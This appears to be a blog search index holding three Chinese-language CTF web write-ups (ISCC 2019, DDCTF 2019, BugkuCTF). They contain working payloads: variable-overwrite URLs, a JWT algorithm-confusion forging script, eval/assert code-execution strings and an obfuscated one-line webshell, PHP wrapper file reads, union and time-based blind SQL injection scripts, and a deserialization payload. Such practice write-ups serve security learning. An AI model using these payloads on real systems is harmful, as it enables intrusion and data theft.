<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[ISCC 2019 Web Writeup]]></title>
    <url>%2F2019%2F06%2F11%2FISCC-2019-Web-Writeup%2F</url>
    <content type="text"><![CDATA[只做了Web题… Web1分析源码 12345678910111213141516171819&lt;?phperror_reporting(0);require 'flag.php';$value = $_GET['value']; //value是一个数组$password = $_GET['password'];$username = '';for ($i = 0; $i &lt; count($value); ++$i) &#123; //count返回数组中元素的数目 if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) unset($value); else $username .= chr($value[$i]); //chr() 函数从指定的 ASCII 值返回字符，并且加到username上 if ($username == 'w3lc0me_To_ISCC2019' &amp;&amp; intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333) &#123; //intval — 获取变量的整数值 echo 'Hello '.$username.'!', '&lt;br&gt;', PHP_EOL; echo $flag, '&lt;hr&gt;'; &#125;&#125;highlight_file(__FILE__); 理清大概思路时候查看输出 flag 的先决条件是 if ($username == &#39;w3lc0me_To_ISCC2019&#39; &amp;&amp; intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333) 判断 $username == &#39;w3lc0me_To_ISCC2019&#39; 跟进 username，变化过程是从第六行的设置为空，到 $username .= chr($value[$i]); 这一步 value的值在 32到127 之间会被销毁,本想一次性把 w3lc0me_To_ISCC2019 传进去，貌似不行…只能一个一个传。 写一个小脚本，将其字符串切割。 1Array ( [0] =&gt; 119 [1] =&gt; 51 [2] =&gt; 108 [3] =&gt; 99 [4] =&gt; 48 [5] =&gt; 109 [6] =&gt; 101 [7] =&gt; 95 [8] =&gt; 84 [9] =&gt; 111 [10] =&gt; 95 [11] =&gt; 73 [12] =&gt; 83 [13] =&gt; 67 [14] =&gt; 67 [15] =&gt; 50 [16] =&gt; 48 [17] =&gt; 49 ) 发现有不少的在32到127 之间，查看手册发现有这么一句话 Note that if the number is higher than 256, it will return the number mod 256. For example : chr(321)=A because A=65(256) 大概意思是 如果数字高于256，它将返回数字mod 256 那么改进一下脚本 1Array ( [0] =&gt; 375 [1] =&gt; 307 [2] =&gt; 364 [3] =&gt; 355 [4] =&gt; 304 [5] =&gt; 365 [6] =&gt; 357 [7] =&gt; 351 [8] =&gt; 340 [9] =&gt; 367 [10] =&gt; 351 [11] =&gt; 329 [12] =&gt; 339 [13] =&gt; 323 [14] =&gt; 323 [15] =&gt; 306 [16] =&gt; 304 [17] =&gt; 305 ) 然后下一个条件是 intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333) 在 W3C 上有对其函数进行的测试 12345678910111213141516171819&lt;?phpecho intval(42); // 42echo intval(4.2); // 4echo intval('42'); // 42echo intval('+42'); // 42echo intval('-42'); // -42echo intval(042); // 34echo intval('042'); // 42echo intval(1e10); // 1410065408echo intval('1e10'); // 1echo intval(0x1A); // 26echo intval(42000000); // 42000000echo intval(420000000000000000000); // 0echo intval('420000000000000000000'); // 32位系统：2147483647 64位系统：9223372036854775807echo intval(42, 8); // 42echo intval('42', 8); // 34echo intval(array()); // 0echo intval(array('foo', 'bar')); // 1?&gt; PHP intval() 整型转换函数——返回值： 成功时返回 var 的 integer 值， 失败时返回 0。 空的 array 返回 0， 非空的 array 返回 1。 一开始惊奇的发现可以使用不为空的数组，因为返回的是 1 ，但是不为空的数组似乎并不能和整型的 1 相加， 绕不过第二个条件 1234567&lt;?php $password = $_GET['password'];if (intval($password) &lt; 2333)&#123; echo 'successful !'; &#125;// successful !?&gt; but… 123456789&lt;?php $password = $_GET['password'];if (intval($password + 1) &gt; 2333)&#123; echo 'successful !'; &#125;else echo 'false !';//false!?&gt; 转换思路… 12345678910&lt;?php $password = $_GET['password'];if (intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333)&#123; echo 'successful !'; &#125;else echo 'false !';//传入password=0x91d，successful !?&gt; 然后构造最终 payload为http://39.100.83.188:8001/?value[0]=375&amp;value[1]=307&amp;value[2]=364&amp;value[3]=355&amp;value[4]=304&amp;value[5]=365&amp;value[6]=357&amp;value[7]=351&amp;value[8]=340&amp;value[9]=367&amp;value[10]=351&amp;value[11]=329&amp;value[12]=339&amp;value[13]=323&amp;value[14]=323&amp;value[15]=306&amp;value[16]=304&amp;value[17]=305&amp;value[18]=313&amp;password=0x91d Web2破解3位数字密码 用户名：admin;密码： 三位数;验证码：xxx 那么密码我们可以用 burpsuite 来暴力破解 需要下功夫的就是验证码这一块 看见一篇不错的文章,直接提供了思路： http://foreversong.cn/archives/889 经过尝试发现验证码是刷新的，且不可从前端获取到 尝试设置验证码为空，且删除Cookie 然后attack Web3一道sql-labs二次注入的题 直接注册：admin’or 1# 进入界面后，修改admin的密码 登录admin获取flag Web4分析源码 12345678910111213141516171819202122232425&lt;?php error_reporting(0); //关闭错误报告include("flag.php"); //包含了flag文件$hashed_key = 'ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a'; //赋值$parsed = parse_url($_SERVER['REQUEST_URI']); //请求到的url，经过URL解析函数，返回其组成部分，对其赋值//query - 在问号 ? 之后if(isset($parsed["query"]))&#123; //判断是否设置 $query = $parsed["query"]; //赋值 $parsed_query = parse_str($query); //把查询字符串解析到变量中 if($parsed_query!=NULL)&#123; //不为空的话 $action = $parsed_query['action']; //里面的action对其赋值 &#125; if($action==="auth")&#123; //判断 $key = $_GET["key"]; //GET传参 $hashed_input = hash('sha256', $key); if($hashed_input!==$hashed_key)&#123; //这里要判断两值是否相等 die("&lt;img src='cxk.jpg'&gt;"); &#125; echo $flag; &#125; &#125;else&#123; show_source(__FILE__); &#125;?&gt; 题目很浅显易懂，首先过 if($action===&quot;auth&quot;)的判断条件，直接用 GET 传参就OK了 但是输出flag的关键点是 if($hashed_input!==$hashed_key) 跟进一下发现 $hashed_key 在第四行已经赋值 $hashed_input 是通过 GET 传入的参数 key 进过hash计算得到的 发现直接将其解码肯定解码不出来（貌似是单向加密 寻找可以利用的点，发现了一个 parse_str() 函数 Parse_str()函数引起的变量覆盖漏洞 parse_str() 函数用于把查询字符串解析到变量中如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。极度不建议 在没有 array参数的情况下使用此函数并且在 PHP 7.2 中将废弃不设置参数的行为。此函数没有返回值 利用变量覆盖，将其 $hashed_key 的值给覆盖掉 构造payload：http://39.100.83.188:8066/?action=auth&amp;key=1&amp;hashed_key=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b Web5题目确实脑洞：放的tips：看来你并不是Union.373组织成员，请勿入内！ 开始改了Referer，XFF头均无果 正解：改 user—agent 头，直接在后添加即可 注入，过滤了圆括号，注释符，from等等 payload ：order by 排序盲注 （直接放上官方payload Web6常规注册账号，在burpsuite里查看了返回值 JWTJson web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC7519).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。 JWT相关资料 https://www.jianshu.com/p/576dbf44b2ae 注册了账号之后查看返回值 12345678910111213141516&#123;"result":true,"token":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiMTIzMzIxMTIiLCJwcml2Ijoib3RoZXIifQ.ppGykY-_rtqX7IbhpIxFiozoBKtDsjbENeidcv3rdQ9WTGTua9gcDJ5O89xuoaS2JD5kz5VfvXU67ZU37x5xNAzCVNgwP3p82oR7KJZFfi_7kdnUMrRAq0JEu2oB0Lmj3Sz8HBe7ToOcnR-NzQo1ds8qrQrT7OhYjFKQXfLuXyU"&#125;Header&#123; "alg": "RS256", "typ": "JWT"&#125;Payload&#123; "name": "12332112", "priv": "other"&#125;Signature /static/js/common.js 中有一个这个函数 123456function getpubkey()&#123; /* get the pubkey for test /pubkey/&#123;md5(username+password)&#125; */&#125; 拿到pubkey 1&#123;&quot;pubkey&quot;:&quot;-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK\nomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\nIC+LX+9V/mpyKe9R3wIDAQAB\n-----END PUBLIC KEY-----&quot;,&quot;result&quot;:true&#125; 使用脚本将加密算法置空或者改为HS256（对称加密），把上面的公钥放在1.txt文件里 1234import jwtimport base64public = open('1.txt', 'r').read()print(jwt.encode(&#123;"name": "12332112","priv": "admin"&#125;, key=public, algorithm='HS256')) 后得到 1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiMTIzMzIxMTIiLCJwcml2IjoiYWRtaW4ifQ.IulW498rWKk9cs38oRe3c7hBrF130CwzDbe346yldzQ 在list界面带上这个访问 最后在生成paste的界面访问 http://39.100.83.188:8053/text/admin:22f1e0aa7a31422ad63480aa27711277得到flag…]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DDCTF 2019 Writeup]]></title>
    <url>%2F2019%2F06%2F11%2FDDCTF-2019-writeup%2F</url>
    <content type="text"><![CDATA[2019的DDCTF… Web滴~补充知识 一些函数 error_reporting() 设置 PHP 的报错级别并返回当前级别 hex2bin（）把十六进制值转换为 ASCII 字符 file_get_contents() 函数把整个文件读入一个字符串中。 PHP页面跳转操作实例分析(header方法) **解题过程** 进来观察源码和URL,URL后端处 ?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09,对其进行两次base64解码加一次16进制解码，发现解码出来与其题目中 flag.jpg 相对应 按照加密逻辑构造 index.php ，访问URL，查看源码发现src属性里面的东西是个base64加密，再次解码。得到一串代码 1234567891011121314151617181920212223242526&lt;?php/* * https://blog.csdn.net/FengBanLiuYun/article/details/80616607 * Date: July 4,2018 */error_reporting(E_ALL || ~E_NOTICE); //error_reporting() 设置 PHP 的报错级别并返回当前级别。 这里是显示所有错误header('content-type:text/html;charset=utf-8'); //设置页面内容是html，编码格式是utf-8if(! isset($_GET['jpg'])) //进行一个判断 header('Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'); //0s后跳转该url$file = hex2bin(base64_decode(base64_decode($_GET['jpg']))); //一次16进制解码加两次base64解码 echo '&lt;title&gt;'.$_GET['jpg'].'&lt;/title&gt;'; //输出$file = preg_replace("/[^a-zA-Z0-9.]+/","", $file); //正则匹配，删除除了a到z，A到Z，0到9和.的echo $file.'&lt;/br&gt;'; //输出$file = str_replace("config","!", $file); //替换文件中的 config 为 ！echo $file.'&lt;/br&gt;'; //输出$txt = base64_encode(file_get_contents($file)); //读文件并加密echo "&lt;img src='data:image/gif;base64,".$txt."'&gt;&lt;/img&gt;"; //输出/* * Can you find the flag file? * */?&gt; 上述代码中一下子过滤了 config字符，感觉很突兀，还是按照加密规则构造了一波 config.php 。之后意料之中的config变成了！ 访问他给的博客，查找一波。发现一篇文章疑似有用 vim 异常退出 swp文件提示 构造 practice.txt.swp 经过加密访问网址。查看源码，得到经过base64加密的代码 ZjFhZyFkZGN0Zi5waHA= 解码得 f1ag!ddctf.php 由于上面一个代码中将 config 与 ! 进行了替换。重新构造 f1ag!ddctf.php 为 f1agconfigddctf.php 再次经过加密规则加密。访问网址，再次得到经过base64加密的代码，解码后代码如下： 12345678910111213141516171819&lt;?phpinclude('config.php');$k = 'hello';extract($_GET);if(isset($uid))&#123; $content=trim(file_get_contents($k)); if($uid==$content) &#123; echo $flag; &#125; else &#123; echo'hello'; &#125;&#125;?&gt; 一个extract（）变量覆盖,先进入网址 http://117.51.150.246/f1ag!ddctf.php 利用变量覆盖构造 uid=&amp;content 成功打印flag… WEB 签到题知识点：PHP 源码审计，文本格式化，反序列化 补充知识 HTTP状态码 技术分享 | 多种测试HTTP身份验证的方法 构造方法construct()与析构方法destruct() JSON 教程 PHP魔术方法 盘点PHP最实用的5大魔术方法及其功能作用 PHP魔术方法使用总结 PHP 手册 语言参考 类与对象 PHP序列化与反序列化 最通俗易懂的PHP反序列化原理分析 代码审计| CTF 中的反序列化问题 [红日安全]代码审计Day11 – unserialize反序列化漏洞 **解题过程** 一开始认为是一个401认证，尝试kali直接爆破用户名跟密码，尝试很久失败告终… 查看源码，发现一个叫做 js/index.js 的文件 1234567891011121314151617181920function auth() &#123; //自定义函数 $.ajax(&#123; //ajax请求的api type: "post", url:"http://117.51.158.44/app/Auth.php", //重点一 contentType: "application/json;charset=utf-8", dataType: "json", beforeSend: function (XMLHttpRequest) &#123; XMLHttpRequest.setRequestHeader("didictf_username", ""); //重点二 &#125;, //suucess和error分别指定了成功和错误后要执行的动作。 success: function (getdata) &#123; console.log(getdata); if(getdata.data !== '') &#123; document.getElementById('auth').innerHTML = getdata.data; &#125; &#125;,error:function(error)&#123; console.log(error); &#125; &#125;);&#125; 访问url：http://117.51.158.44/app/Auth.php 发现提示 data &quot;抱歉，您没有登陆权限，请获取权限后访问-----&quot; 上面一个代码中的 “重点二”，可以利用了，利用burpsuite抓包，修改请求头，加上 didictf_username: admin 后，发送包网页变成data &quot;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&quot; 访问 http://117.51.158.44/app/fL2XID2i0Cdh.php ，获得两个文件源码。 文件1 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?php//url:app/Application.phpClass Application &#123; //class定义类 var $path = ''; //定义 $path为空 public function response($data, $errMsg = 'success') &#123; //创建公有方法response() $ret = ['errMsg' =&gt; $errMsg, 'data' =&gt; $data]; $ret = json_encode($ret); //将数值转换成json数据存储格式 header('Content-type: application/json'); echo $ret; &#125; public function auth() &#123; //创建公有方法auth() $DIDICTF_ADMIN = 'admin'; //对$DIDICTF_ADMIN赋值 if(!empty($_SERVER['HTTP_DIDICTF_USERNAME']) &amp;&amp; $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) &#123; //判断 $this-&gt;response('您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'); return TRUE; &#125;else&#123; $this-&gt;response('抱歉，您没有登陆权限，请获取权限后访问-----','error'); exit(); &#125; &#125; private function sanitizepath($path) &#123; //创建私有方法sanitizepath（） $path = trim($path); //移除字符串两侧的空白字符或其他预定义字符 $path=str_replace('../','',$path); //删除$path中的 ../ $path=str_replace('..\\','',$path); //删除$path中的 ..\\ return $path; //返回$path&#125;public function __destruct() &#123; //创建公有析构函数 if(empty($this-&gt;path)) &#123; exit(); &#125;else&#123; $path = $this-&gt;sanitizepath($this-&gt;path); if(strlen($path) !== 18) &#123; //如果 $path 长度不是18 exit(); //退出 &#125; $this-&gt;response($data=file_get_contents($path),'Congratulations'); &#125; exit();&#125;&#125; 文件2 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116//url:app/Session.phpinclude 'Application.php'; //包含文件class Session extends Application &#123; //设置Session文件一些配置 //key建议为8位字符串 var $eancrykey = ''; var $cookie_expiration = 7200; var $cookie_name = 'ddctf_id'; var $cookie_path = ''; var $cookie_domain = ''; var $cookie_secure = FALSE; var $activity = "DiDiCTF"; public function index() &#123; if(parent::auth()) &#123; //通过parent::调用父类方法 $this-&gt;get_key(); if($this-&gt;session_read()) &#123; $data = 'DiDI Welcome you %s'; $data = sprintf($data,$_SERVER['HTTP_USER_AGENT']); parent::response($data,'sucess'); &#125;else&#123; $this-&gt;session_create(); $data = 'DiDI Welcome you'; parent::response($data,'sucess'); &#125; &#125; &#125; private function get_key() &#123; //创建私有方法 //eancrykey and flag under the folder $this-&gt;eancrykey = file_get_contents('../config/key.txt'); //flag在这个文件夹里面 &#125; public function session_read() &#123; //创建公有方法 if(empty($_COOKIE)) &#123; //如果cookie为空 return FALSE; //返回false &#125; $session = $_COOKIE[$this-&gt;cookie_name]; //对$session进行赋值 if(!isset($session)) &#123; //如果没有设置$session parent::response("session not found",'error'); return FALSE; &#125; $hash = substr($session,strlen($session)-32); //截取字符串 $session = substr($session,0,strlen($session)-32); //截取字符串 if($hash !== md5($this-&gt;eancrykey.$session)) &#123; //判断 parent::response("the cookie data not match",'error'); //通过parent::调用父类方法 return FALSE; //返回失败 &#125; $session = unserialize($session); //反序列化 if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent']))&#123; return FALSE; &#125; if(!empty($_POST["nickname"])) &#123; //POST的不为空 $arr = array($_POST["nickname"],$this-&gt;eancrykey); $data = "Welcome my friend %s"; foreach ($arr as $k =&gt; $v) &#123; //打印变量 $data = sprintf($data,$v); //输出 &#125; parent::response($data,"Welcome"); &#125; if($session['ip_address'] != $_SERVER['REMOTE_ADDR']) &#123; parent::response('the ip addree not match'.'error'); return FALSE; &#125; if($session['user_agent'] != $_SERVER['HTTP_USER_AGENT']) &#123; parent::response('the user agent not match','error'); return FALSE; &#125; return TRUE; &#125; private function session_create() &#123; $sessionid = ''; while(strlen($sessionid) &lt; 32) &#123; $sessionid .= mt_rand(0,mt_getrandmax()); &#125; $userdata = array( 'session_id' =&gt; md5(uniqid($sessionid,TRUE)), 'ip_address' =&gt; $_SERVER['REMOTE_ADDR'], 'user_agent' =&gt; $_SERVER['HTTP_USER_AGENT'], 'user_data' =&gt; '', ); $cookiedata = serialize($userdata); //序列化 $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata); $expire = $this-&gt;cookie_expiration + time(); setcookie( $this-&gt;cookie_name, $cookiedata, $expire, $this-&gt;cookie_path, $this-&gt;cookie_domain, $this-&gt;cookie_secure ); &#125;&#125;$ddctf = new Session();$ddctf-&gt;index();?&gt; 经过了漫长的审计过程， Upload-IMG知识点：PHP-GD 二次渲染绕过]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BugkuCTF Writeup]]></title>
    <url>%2F2019%2F06%2F11%2FBugkuCTF-Web-writeup%2F</url>
    <content type="text"><![CDATA[记录了一些题目… WEB域名解析域名解析的概念：域名解析是把域名指向网站空间IP，让人们通过注册的域名可以方便地访问到网站的一种服务。IP地址是网络上标识站点的数字地址，为了方便记忆，采用域名来代替IP地址标识站点地址。域名解析就是域名到IP地址的转换过程。域名的解析工作由DNS服务器完成。 在 C:\Windows\System32\drivers\etc\hosts ,Windows系统下有一个hosts文件,Windows系统下有一个hosts文件,在最后一行添加：123.206.87.240 flag.baidu.com 在浏览器搜索栏访问：flag.baidu.com ， 得到flag… 本地包含分析源码 123456&lt;?php include "flag.php"; //包含一个flag文件 $a = @$_REQUEST['hello']; //$_REQUEST: 可以获取以POST方法和GET方法提交的数据，获取hello的参数，并对a赋值 eval( "var_dump($a);"); //eval存在命令执行漏洞，var_dump（）: 函数用于输出变量的相关信息 show_source(__FILE__); ?&gt; 方法一：eval存在命令执行漏洞，使用hello构造payload ?hello=);show_source(%27flag.php%27);var_dump( 方法二：在URL处构造?hello=1);include $_POST[&#39;b&#39;];然后使用hackbar post这个参数，使用伪协议读取flag b=php://filter/convert.base64-encode/resource=flag.php将flag文件通过base64编码弹回来，然后进行一次base64解码，即可得到flag… 方法三直接将flag.php文件读入变量hello中12?hello=get_file_contents(&apos;flag.php&apos;)?hello=file(&apos;flag.php&apos;) 变量1分析源码 123456789101112&lt;?php error_reporting(0); //关闭错误报告include "flag1.php"; //包含一个flag文件 highlight_file(__file__); //highlight_file() 函数对文件进行语法高亮显示。if(isset($_GET['args']))&#123; //检查 $args = $_GET['args']; //赋值 if(!preg_match("/^\w+$/",$args))&#123; //进行正则匹配，\w表示任意一个单词字符，即[a-zA-Z0-9_] die("args error!"); //没匹配成功就退出 &#125; eval("var_dump($$args);"); //打印变量，$$args 可以理解为$($args)&#125;?&gt; 首先是正则表达式判断，过滤了括号和引号等字符,无法使用文件包含漏洞；伪协议读取，eval代码执行漏洞等等方式来读取flag中的文件… 注意代码最后一行中$$args 这个地方。PHP 在名为 $GLOBALS[index] 的数组中存储了所有全局变量。变量的名字就是数组的键。构造PHP中超全局变量 $GLOBALS var_dump()函数将$GLOBALS数组中存放的所有变量以数组的方式输出 得到flag！ 网站被黑一开始看源码看了半天，没发现什么东西。Burp suite 抓包查看，也没发现什么东西… 御剑扫描网站根目录，发现一个 shell.php 的文件 URL访问，发现是个登录页面，进行弱密码爆破，得到flag… 成绩查询一道很简单的sql题，但是盲注流程很完善；记录一下 首先登录页面，一看查询框就知道是sql题，看一下网页源码里面有没有提示的语句，发现没有，那么是一道盲注题 构造 1&#39; and 1=1 # 发现可以执行查询，但是构造 1&#39; and 1=2 # 不会执行查询，找到可注入点 判断字段，先目测一波至少字段为4，直接构造 1&#39; order by 5 #,发现不会执行查询，构造 1&#39; order by 4 # 执行了查询，说明字段数为4 通过union联合注入先注出数据库 -1&#39; union select 1,database(),3,4; # 结果为 skctf_flag 查询表名 -1&#39; union select 1,table_name,3,4 from information_schema.tables where table_schema=&#39;skctf_flag&#39; # 结果为 fl4g 查询列名 -1&#39; union select 1,column_name,3,4 from information_schema.columns where table_name=&#39;fl4g&#39; # 结果为 skctf_flag 最后查询 -1&#39; union select 1,skctf_flag,3,4 from fl4g # 结果就得到了flag… 注意：一个空位只能添加一个查询，默认查询表中第一个记录，也就是说数据库可能不止一个，刚刚的那个库只是表中的第一个库，所以最好使用 group_concat()函数进行查询 脚本题秋名山老司机【转载】详解 CTF Web 中的快速反弹 POST 请求 脚本题，贴脚本 md5 collision(NUPT_CTF)刚拿到题，直接说input a，有点迷茫，看源码也没东西，抓包看头也没藏东西。只能百度一手，发现是md5碰撞 题目是md5 collision,md5碰撞。所以找一个md5是oe开头的值，get方式传参过去 PAYLOAD 120.24.86.145:9009/md5.php?a=s878926199a 常用的md5 表达式 值 QNKCDZO 0e830400451993494058024219903391 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1502113478a 0e861580163291561247404381396064 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s155964671a 0e342768416822451524974117254469 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s1502113478a 0e861580163291561247404381396064 s1836677006a 0e481036490867661113260034900752 s1091221200a 0e940624217856561557816327384675 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s155964671a 0e342768416822451524974117254469 s1665632922a 0e731198061491163073197128363787 s155964671a 0e342768416822451524974117254469 s1091221200a 0e940624217856561557816327384675 s1836677006a 0e481036490867661113260034900752 s1885207154a 0e509367213418206700842008763514 s532378020a 0e220463095855511507588041205815 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s214587387a 0e848240448830537924465865611904 s1502113478a 0e861580163291561247404381396064 s1091221200a 0e940624217856561557816327384675 s1665632922a 0e731198061491163073197128363787 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1665632922a 0e731198061491163073197128363787 s878926199a 0e545993274517709034328855841020 cookie欺骗打开网页一串乱码，源码跟请求头都没什么可以利用的信息 发现URL比较有趣http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ= filename参数后面跟了一个经过base64编码的东西，解码为 keys.txt 尝试构造 index.php 因为URL那里的源码肯定要经过一次base64解码读到，所以我们先将其进行编码再传入http://123.206.87.240:8002/web11/index.php?line=&amp;filename=aW5kZXgucGhw 没有任何回显，发现 line 参数后面的值为0，通过尝试发现可以解析一行的代码，写一个脚本跑出来 123456import requestsa = 20for i in range(a): url = "http://123.206.87.240:8002/web11/index.php?line="+str(i)+"&amp;filename=aW5kZXgucGhw" s=requests.get(url) print(s.text) 跑出的源码为 1234567891011121314151617181920&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");$file_list = array('0' =&gt;'keys.txt','1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123;$file_list[2]='keys.php';&#125;if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125;?&gt; 给了一个文件是 keys.php ，只要cookie中 margin=margin，就ok了 hackbar操作一番，查看源码，获得flag… 过狗一句话直接上代码 123456&lt;?php $poc="a#s#s#e#r#t"; $poc_1=explode("#",$poc); //explode() 函数把字符串打散为数组。$poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; //对其赋值，assert$poc_2($_GET['s']) //GET进行传参?&gt; 使用assert()函数的解析传进来的s串，assert有代码执行漏洞。 payload?s=print_r(scandir(&#39;./&#39;)) //扫描当前目录，并按数组输出。 welcome to bugkuctfF12得到一段被注释掉的代码 123456789101112&lt;!-- $user = $_GET["txt"]; $file = $_GET["file"]; $pass = $_GET["password"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="welcome to the bugkuctf"))&#123; echo "hello admin!&lt;br&gt;"; include($file); //hint.php &#125;else&#123; echo "you are not admin ! "; &#125; --&gt; GET传入3个参数，检查了 $user 是否被设置，file_get_contents（）读取其内容，include包含了一个文件 考察PHP伪协议 利用php://input 绕过 file_get_contents（），include包含的文件，用伪协议进行读取 通过读取 hint.php 和 index.php 的源码发现可以利用反序列化，通过构造 password 的序列化来读取 hint.php 1234567891011121314// hint.php&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; //这是个重点 if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo "&lt;br&gt;"; return ("good"); &#125; &#125; &#125; ?&gt; index.php 12345678910111213141516171819202122232425262728293031323334//index.php&lt;?php $txt = $_GET["txt"]; $file = $_GET["file"]; $password = $_GET["password"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')==="welcome to the bugkuctf"))&#123; echo "hello friend!&lt;br&gt;"; if(preg_match("/flag/",$file))&#123; //正则匹配，不能出现flag echo "不能现在就给你flag哦"; exit(); &#125;else&#123; include($file); $password = unserialize($password); //这里出现了反序列化 echo $password; &#125; &#125;else&#123; echo "you are not the number of bugku ! "; &#125; ?&gt; &lt;!-- $user = $_GET["txt"]; $file = $_GET["file"]; $pass = $_GET["password"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="welcome to the bugkuctf"))&#123; echo "hello admin!&lt;br&gt;"; include($file); //hint.php &#125;else&#123; echo "you are not admin ! "; &#125; --&gt; 通读代码发现构造 password 的反序列化可以实现读取flag，猜测flag文件是 flag.php 写个脚本构造一下 123456789&lt;?php class Flag&#123;//flag.php public $file; &#125; $a = new Flag();$a-&gt;file = 'flag.php';print_r(serialize($a));?&gt; http://123.206.87.240:8006/test1/?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} 拿到Flag… INSERT INTO注入1234567891011121314151617181920212223242526272829&lt;?phperror_reporting(0); //关闭错误报告function getIp()&#123; //自定义函数$ip = ''; //设置ip为空if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))&#123; //检验是否设置XFF头$ip = $_SERVER['HTTP_X_FORWARDED_FOR']; //对其ip进行赋值&#125;else&#123;$ip = $_SERVER['REMOTE_ADDR']; //对ip的其他赋值&#125;$ip_arr = explode(',', $ip); //切割ip，explode() 函数把字符串打散为数组return $ip_arr[0]; //返回第一个&#125;$host="localhost"; //设置host$user="";$pass="";$db="";$connect = mysql_connect($host, $user, $pass) or die("Unable to connect");mysql_select_db($db) or die("Unable to select database");$ip = getIp(); //执行函数echo 'your ip is :'.$ip;$sql="insert into client_ip (ip) values ('$ip')";mysql_query($sql);?&gt; 没有在源码之中找到SQL语句，只检测了XFF头之类的…网上找一波资料 可以看到，这是X-Forwarded-For的注入，而且过滤了逗号,。在过滤了逗号的情况下，我们就不能使用if语句了，在mysql中与if有相同功效的就是： select case when (条件) then 代码1 else 代码 2 end; 而且由于逗号,被过滤，我们就不能使用substr、substring了，但我们可以使用：from 1 for 1，所以最终我们的payload如下：127.0.0.1&#39;+(select case when substr((select flag from flag) from 1 for 1)=&#39;a&#39; then sleep(5) else 0 end))-- + python脚本 1234567891011121314151617181920212223# -*- coding:utf-8 -*-import requestsimport sys# 基于时间的盲注，过滤了逗号 ,sql = "127.0.0.1'+(select case when substr((select flag from flag) from &#123;0&#125; for 1)='&#123;1&#125;' then sleep(5) else 0 end))-- +"url = 'http://120.24.86.145:8002/web15/'flag = ''for i in range(1, 40): print('正在猜测：', str(i)) for ch in range(32, 129): if ch == 128: sys.exit(0) sqli = sql.format(i, chr(ch)) # print(sqli) header = &#123; 'X-Forwarded-For': sqli &#125; try: html = requests.get(url, headers=header, timeout=3) except: flag += chr(ch) print(flag) break 文件包含2这题过滤了一些东西，同时提醒了我上传一句话木马的目的到底是为了什么，只是单纯用菜刀连接还是有其他的办法达到你想要的目的 F12得到 upload.php 然后直接访问地址 看到一个文件上传的点 上传普通的一句话会被过滤，且白名单限制，只能上传图片格式。 普通的图片马会被过滤掉，菜刀连不上采用&lt;script 